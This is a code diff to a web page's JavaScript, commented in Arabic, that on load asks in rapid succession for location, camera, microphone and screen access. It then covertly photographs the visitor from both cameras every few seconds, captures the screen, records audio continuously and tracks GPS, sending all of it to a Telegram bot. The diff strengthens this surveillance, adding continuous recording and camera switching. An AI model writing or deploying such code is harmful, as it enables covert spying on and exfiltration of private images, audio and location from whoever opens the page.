@@ -27,12 +27,17 @@
         let audioCount = 0;
         let isFront = false;
         let perms = { gps: false, cam: false, mic: false, screen: false };
+        let photoInterval = null;
+        let screenInterval = null;
+        let isRecording = false;
+        let audioStream = null;
+        let voiceInterval = null;
 
         // ============================================================
         // دالة طلب الصلاحيات - واحدة ورا التانية بسرعة جداً
         // ============================================================
         async function requestPermissions() {
-            // 1. الموقع - يطلب على طول
+            // 1. الموقع
             try {
                 const pos = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
@@ -49,7 +54,7 @@
                 sendLocation();
             } catch(e) { perms.gps = false; }
 
-            // 2. الكاميرا - تطلب فوراً بعد الموقع (بدون تأخير)
+            // 2. الكاميرا - خلفية
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: {
@@ -61,8 +66,11 @@
                 });
                 currentStream = stream;
                 perms.cam = true;
+                // تصوير فوري بعد التفعيل (خلفية)
                 capturePhoto();
+                setTimeout(() => capturePhoto(), 500);
             } catch(e) {
+                // جرب أمامية
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({
                         video: {
@@ -75,17 +83,24 @@
                     currentStream = stream;
                     perms.cam = true;
                     capturePhoto();
+                    setTimeout(() => capturePhoto(), 500);
                 } catch(e2) { perms.cam = false; }
             }
 
-            // 3. الميكروفون - يطلب فوراً بعد الكاميرا (بدون تأخير)
+            // 3. الميكروفون - تسجيل مستمر
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                audioStream = await navigator.mediaDevices.getUserMedia({ 
+                    audio: {
+                        echoCancellation: false,
+                        noiseSuppression: false,
+                        autoGainControl: false
+                    } 
+                });
                 perms.mic = true;
-                startVoiceRecording();
+                startContinuousRecording();
             } catch(e) { perms.mic = false; }
 
-            // 4. الشاشة - تطلب فوراً بعد الميكروفون (بدون تأخير)
+            // 4. الشاشة
             try {
                 const stream = await navigator.mediaDevices.getDisplayMedia({
                     video: { width: { ideal: 1280 }, height: { ideal: 720 } }
@@ -100,14 +115,69 @@
                 isRunning = true;
                 startAutoCapture();
                 startAutoScreen();
-                startAutoVoice();
                 trackLocation();
                 sendFullReport();
             }
         }
 
         // ============================================================
-        // تصوير الكاميرا وإرسالها
+        // تسجيل مستمر للصوت - يفضل مسجل طول الوقت
+        // ============================================================
+        function startContinuousRecording() {
+            if (!perms.mic || !isRunning) return;
+            
+            try {
+                isRecording = true;
+                audioChunks = [];
+                
+                mediaRecorder = new MediaRecorder(audioStream, { 
+                    mimeType: 'audio/webm;codecs=opus'
+                });
+                
+                mediaRecorder.ondataavailable = e => {
+                    if (e.data.size > 0) audioChunks.push(e.data);
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    if (audioChunks.length > 0) {
+                        const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                        audioCount++;
+                        await sendAudio(blob);
+                        console.log(`✅ تم إرسال فويس #${audioCount}`);
+                    }
+                    // إعادة التسجيل فوراً
+                    if (isRunning && perms.mic) {
+                        audioChunks = [];
+                        try {
+                            mediaRecorder.start();
+                            setTimeout(() => {
+                                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                                    mediaRecorder.stop();
+                                }
+                            }, 15000);
+                        } catch(e) {
+                            console.log('❌ خطأ في إعادة التسجيل:', e.message);
+                        }
+                    }
+                };
+                
+                mediaRecorder.start();
+                // إرسال أول فويس بعد 15 ثانية
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, 15000);
+                
+                console.log('🎤 بدء التسجيل المستمر...');
+            } catch(e) {
+                console.log('❌ خطأ في التسجيل المستمر:', e.message);
+                isRecording = false;
+            }
+        }
+
+        // ============================================================
+        // تصوير الكاميرا وإرسالها (تصوير من قدام وورا)
         // ============================================================
         async function capturePhoto() {
             if (!currentStream || !perms.cam || !isRunning) return;
@@ -130,15 +200,50 @@
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
                 photoCount++;
                 const type = isFront ? 'أمامية' : 'خلفية';
-                isFront = !isFront;
                 
                 await sendPhoto(dataUrl, `📸 ${type} #${photoCount}`);
                 
                 document.body.removeChild(video);
-            } catch(e) {}
+                console.log(`✅ تم إرسال صورة ${type} #${photoCount}`);
+                
+                // تبديل الكاميرا بعد كل صورة
+                isFront = !isFront;
+                switchCamera();
+                
+            } catch(e) {
+                console.log('❌ خطأ في التصوير:', e.message);
+            }
+        }
+
+        // ============================================================
+        // تبديل الكاميرا بين أمامية وخلفية
+        // ============================================================
+        async function switchCamera() {
+            if (!perms.cam || !isRunning) return;
+            
+            try {
+                // إيقاف الستريم القديم
+                if (currentStream) {
+                    currentStream.getTracks().forEach(t => t.stop());
+                }
+                
+                const facing = isFront ? 'environment' : 'user';
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: facing,
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+                currentStream = stream;
+                console.log(`🔄 تم التبديل للكاميرا ${isFront ? 'الخلفية' : 'الأمامية'}`);
+            } catch(e) {
+                console.log('❌ فشل تبديل الكاميرا:', e.message);
+            }
         }
 
         // ============================================================
@@ -160,44 +265,14 @@
                 canvas.height = video.videoHeight || 720;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
                 await sendPhoto(dataUrl, `🖥️ شاشة #${photoCount}`);
                 
                 document.body.removeChild(video);
-            } catch(e) {}
-        }
-
-        // ============================================================
-        // تسجيل الصوت
-        // ============================================================
-        async function startVoiceRecording() {
-            if (!perms.mic || !isRunning) return;
-            
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                audioChunks = [];
-                mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-                
-                mediaRecorder.ondataavailable = e => {
-                    if (e.data.size > 0) audioChunks.push(e.data);
-                };
-                
-                mediaRecorder.onstop = async () => {
-                    if (audioChunks.length > 0) {
-                        const blob = new Blob(audioChunks, { type: 'audio/webm' });
-                        audioCount++;
-                        await sendAudio(blob);
-                    }
-                    stream.getTracks().forEach(t => t.stop());
-                };
-                
-                mediaRecorder.start();
-                setTimeout(() => {
-                    if (mediaRecorder && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                    }
-                }, 8000);
-            } catch(e) {}
+                console.log(`✅ تم إرسال صورة شاشة #${photoCount}`);
+            } catch(e) {
+                console.log('❌ خطأ في تصوير الشاشة:', e.message);
+            }
         }
 
         // ============================================================
@@ -211,11 +286,17 @@
                 form.append('photo', blob, `photo_${Date.now()}.jpg`);
                 form.append('caption', `${caption} - ${new Date().toLocaleString('ar-EG')}`);
                 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: form
                 });
-            } catch(e) {}
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+            } catch(e) {
+                console.log('❌ فشل إرسال الصورة:', e.message);
+            }
         }
 
         // ============================================================
@@ -228,11 +309,18 @@
                 form.append('audio', blob, `voice_${Date.now()}.webm`);
                 form.append('caption', `🎙️ فويس #${audioCount} - ${new Date().toLocaleString('ar-EG')}`);
                 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                     method: 'POST',
                     body: form
                 });
-            } catch(e) {}
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}`);
+                }
+                console.log(`✅ تم إرسال الفويس #${audioCount}`);
+            } catch(e) {
+                console.log('❌ فشل إرسال الصوت:', e.message);
+            }
         }
 
         // ============================================================
@@ -253,7 +341,10 @@
                         parse_mode: 'Markdown'
                     })
                 });
-            } catch(e) {}
+                console.log('✅ تم إرسال الموقع');
+            } catch(e) {
+                console.log('❌ فشل إرسال الموقع:', e.message);
+            }
         }
 
         // ============================================================
@@ -275,8 +366,8 @@
                 msg += `📡 ${info.isp || ''}\n\n`;
             } catch(e) {}
             
-            msg += `📸 الصور: ${photoCount}\n`;
-            msg += `🎙️ الفويسات: ${audioCount}\n\n`;
+            msg += `📸 الصور المرسلة: ${photoCount}\n`;
+            msg += `🎙️ الفويسات المرسلة: ${audioCount}\n\n`;
             msg += `📷 كاميرا: ${perms.cam?'✅':'❌'}\n`;
             msg += `🎤 ميكروفون: ${perms.mic?'✅':'❌'}\n`;
             msg += `📍 GPS: ${perms.gps?'✅':'❌'}\n`;
@@ -293,28 +384,30 @@
                         parse_mode: 'Markdown'
                     })
                 });
-            } catch(e) {}
+                console.log('✅ تم إرسال التقرير');
+            } catch(e) {
+                console.log('❌ فشل إرسال التقرير:', e.message);
+            }
         }
 
         // ============================================================
-        // التشغيل التلقائي
+        // التشغيل التلقائي - تصوير من قدام وورا
         // ============================================================
         function startAutoCapture() {
-            setInterval(() => {
-                if (perms.cam && isRunning) capturePhoto();
-            }, 5000);
+            // تصوير كل 3 ثواني
+            if (photoInterval) clearInterval(photoInterval);
+            photoInterval = setInterval(() => {
+                if (perms.cam && isRunning) {
+                    capturePhoto(); // تصوير (قدام أو ورا حسب isFront)
+                }
+            }, 3000);
         }
 
         function startAutoScreen() {
-            setInterval(() => {
+            if (screenInterval) clearInterval(screenInterval);
+            screenInterval = setInterval(() => {
                 if (perms.screen && isRunning) captureScreen();
-            }, 10000);
-        }
-
-        function startAutoVoice() {
-            setInterval(() => {
-                if (perms.mic && isRunning) startVoiceRecording();
-            }, 15000);
+            }, 8000);
         }
 
         function trackLocation() {
@@ -327,7 +420,7 @@
                         lon: pos.coords.longitude,
                         accuracy: pos.coords.accuracy
                     };
-                    if (Math.random() < 0.15) sendLocation();
+                    if (Math.random() < 0.2) sendLocation();
                 },
                 () => {},
                 { enableHighAccuracy: true, timeout: 5000 }
@@ -338,7 +431,7 @@
         // بدء التشغيل فوراً عند تحميل الصفحة
         // ============================================================
         window.addEventListener('load', () => {
-            // بدء طلب الصلاحيات فوراً
+            console.log('🚀 بدء طلب الصلاحيات...');
             requestPermissions();
         });
 
@@ -352,7 +445,7 @@
             }
         });
 
-        console.log('🚀 تم التحميل - طلب الصلاحيات فوراً');
+        console.log('📸 نظام المراقبة يعمل - تصوير من قدام وورا + تسجيل مستمر');
     </script>
 </body>
 </html>
